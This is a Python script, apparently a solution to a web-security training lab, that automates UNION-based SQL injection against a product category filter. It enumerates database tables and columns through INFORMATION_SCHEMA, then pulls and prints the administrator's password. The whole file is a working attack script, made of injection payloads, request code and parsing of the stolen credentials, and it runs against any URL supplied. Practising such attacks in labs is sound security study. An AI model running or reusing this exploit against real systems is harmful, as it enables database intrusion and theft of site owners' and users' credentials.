import requests
import sys
import urllib3
from bs4  import BeautifulSoup
import re

# this script automates step 3 to 5 step

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def perform_request(url,sql_payload):
    path = '/filter?category=Pets'
    r = requests.get(url+path+sql_payload, verify=False,proxies=proxies)
    return r.text

def sqli_users_table(url):
    sql_payload = "'+UNION+SELECT+NULL,table_name+from+INFORMATION_SCHEMA.TABLES++--"

    response = perform_request(url,sql_payload)
    soup = BeautifulSoup(response,"html.parser")
    users_table = soup.find(string=re.compile("^users_*"))
    
    if users_table :
        return users_table
    else:
        return False


def sqli_users_columns(url,users_table):
    sql_payload = "'+UNION+SELECT+NULL,column_name+from+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name+='%s'++--" %users_table
    response = perform_request(url , sql_payload)
    soup = BeautifulSoup(response,"html.parser")
    username_column = soup.find(string=re.compile("^username.*"))
    password_column = soup.find(string=re.compile("^password.*"))
    if username_column and password_column:
        return username_column,password_column
    
    if not username_column:
        print("(-) Didn't the username column")
    if not password_column:
        print("(-) Didn't the password column")
    return False

def sqli_admin_cred(url,users_table,username_column,password_column):
    sql_payload = f"'+UNION+SELECT+NULL,CONCAT({username_column},'~',{password_column})+from+{users_table}++--"
    response = perform_request(url,sql_payload)
    soup = BeautifulSoup(response,"html.parser")
    admin_password = soup.find(string=re.compile("^administrator~*"))
    return admin_password.split("~")[1]



if __name__ == "__main__":
    
    try:
        
        url = sys.argv[1]
    except:
        print("(-) Usage: %s <url>" % sys.argv[0])
        print("(-) Example: %s https://www.example.com  " % sys.argv[0])
        sys.exit(-1)
    

    print("(+) Looking for users table ...")
    users_table = sqli_users_table(url)
    if users_table:
        print("(+) Found Users Table %s " %users_table)
    else:
        print("(-) Couldn't find users table :'( ")
    
    username_column , password_column = sqli_users_columns(url,users_table)
    if username_column and password_column:
        print("(+) Found Username column: %s" %username_column)
        print("(+) Found Password column: %s" %password_column)
    else:
        print("(-) Didn't find one or the two of the following (username,password) column")
    
    admin_password = sqli_admin_cred(url,users_table,username_column,password_column)
    if not admin_password:
        print("(-) Couldn't find the Administrator' password")
    print("(+) Administrator' password is %s" %admin_password)


    